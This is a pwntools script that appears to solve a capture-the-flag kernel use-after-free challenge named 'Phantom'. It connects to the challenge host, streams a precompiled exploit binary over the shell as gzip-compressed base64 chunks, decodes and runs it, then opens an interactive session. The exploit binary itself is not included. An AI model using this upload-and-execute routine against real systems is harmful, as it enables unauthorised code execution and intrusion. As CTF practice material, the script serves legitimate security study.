#!/usr/bin/env python3
"""
Phantom - Kernel page UAF exploit
Upload static binary to remote QEMU VM via gzip+base64 and execute.
"""
from pwn import *
import base64, gzip, os, time

HOST = "chall.0xfun.org"
PORT = 36790
BINARY_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploit")

def exploit():
    io = remote(HOST, PORT)

    # Wait for boot
    log.info("Waiting for VM boot...")
    time.sleep(5)
    io.recv(timeout=3)

    # Disable echo to speed up upload
    io.sendline(b"stty -echo")
    time.sleep(0.3)
    io.recv(timeout=1)

    # Compress binary
    with open(BINARY_PATH, "rb") as f:
        raw = f.read()
    compressed = gzip.compress(raw, compresslevel=9)
    b64 = base64.b64encode(compressed).decode()
    log.info(f"Binary: {len(raw)} bytes -> gzip: {len(compressed)} -> b64: {len(b64)}")

    # Upload in chunks
    chunk_size = 1024
    io.sendline(b"cat > /tmp/e.b64 << 'ENDOFFILE'")
    time.sleep(0.1)

    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i + chunk_size]
        io.sendline(chunk.encode())
        time.sleep(0.01)

    io.sendline(b"ENDOFFILE")
    time.sleep(1)
    log.info("Upload complete, decoding...")

    io.sendline(b"base64 -d /tmp/e.b64 | gzip -d > /tmp/exploit && chmod +x /tmp/exploit")
    time.sleep(1)

    io.sendline(b"wc -c /tmp/exploit")
    time.sleep(0.5)
    resp = io.recv(timeout=2)
    log.info(f"Size check: {resp.decode(errors='replace').strip()}")

    # Run exploit
    log.info("Running exploit...")
    io.sendline(b"stty echo")
    time.sleep(0.1)
    io.sendline(b"/tmp/exploit")

    io.interactive()

if __name__ == "__main__":
    exploit()
